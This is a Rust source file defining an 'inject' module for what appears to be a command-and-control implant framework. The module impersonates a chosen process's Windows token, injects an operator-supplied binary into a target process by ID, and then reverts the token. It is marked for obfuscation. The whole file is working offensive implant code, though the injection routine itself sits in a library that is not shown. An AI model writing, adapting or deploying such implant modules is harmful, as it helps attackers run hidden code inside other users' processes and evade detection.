use crate::prelude::*;

pub struct Inject {}

#[async_trait]
#[module_impl("inject")]
impl Module for Inject {}

#[async_trait]
#[obfuscate]
impl ModuleImpl for Inject {
    async fn run(&mut self, id: u32, receiver: &mut Input, _: &mut Output) -> ModuleResult {
        let req = check_request!(receiver, Body::Inject)?;
        let bin = check_field!(req.bin)?;

        if req.token_pid != 0 {
            to_error!(malefic_os_win::token::impersonate_process(req.token_pid)
                .map_err(|e| e.to_string()))?;
        }

        let result = malefic_os_win::kit::inject::remote_inject(&*bin, req.pid);

        if req.token_pid != 0 {
            let _ = malefic_os_win::token::revert_to_self();
        }

        to_error!(result)?;
        Ok(TaskResult::new(id))
    }
}
